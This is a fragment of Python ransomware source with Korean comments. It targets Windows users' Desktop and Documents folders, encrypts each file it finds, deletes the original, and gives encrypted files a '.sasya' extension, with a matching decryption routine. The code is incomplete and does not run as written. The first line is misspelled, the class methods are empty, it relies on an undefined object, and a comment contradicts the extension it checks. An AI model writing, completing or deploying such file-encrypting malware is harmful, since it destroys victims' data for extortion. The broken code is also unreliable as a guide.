rimport os, glob, sys
from Crypto.PublicKey import RSA

KSIZE = 1024

class MyRSA():
    def __init__(self, keytext, ivtext):


    def makeEncInfo(self, filename):


    def enc(self, filename):


    def dec(self, encfilename, readKey) :


#aesEnc = myAES('project', 'encAndDec')

def searchEncFile(path):
    for filename in glob.iglob(path, recursive = True):
        if 'key' in filename:
            pass
        elif os.path.isfile(filename):
            print('Encrypting> ' + filename) # 파일명 출력
            aesEnc.makeEncInfo(filename)
            aesEnc.enc(filename) # Encrypt_file에 위에서 선언한 키값과 파일명을 인자로 호출
            os.remove(filename) # 현재파일을 제거 (encrypt_file 함수에서 새파일을 작성하였기에 기존파일을 제거해야함.)
        elif os.path.isdir(filename):
            searchEncFile(filename + '\\*')

def searchDecFile(path):
    for filename in glob.iglob(path, recursive = True):
        if(os.path.isfile(filename)):
            fname, ext = os.path.splitext(filename) # 파일명과 확장자를 추출
            if (ext == '.sasya'): # 확장자가 .enc (암호화된 파일일 때)
                print('Decrypting> ' + filename) # 파일명 출력
                aesEnc.dec(filename) # 복호화 함수 실행
                os.remove(filename)
            if(os.path.isdir(filename)):
                searchDecFile(filename + '\\*')

user = os.getenv("USERNAME")
startPath = 'C:\\Users\\' + user + '\\Desktop\\*'
documentPath = 'C:\\Users\\' + user + '\\Documents\\*'
#startPath = 'C:\\Users\\Yeeun\\Desktop\\Ransom_Private\\Ransom\\test\\*'
keyPath = 'C:\\Users\\' + user + '\\'
print(glob.glob(startPath, recursive=True))

#searchEncFile(startPath)
#searchEncFile(documentPath)
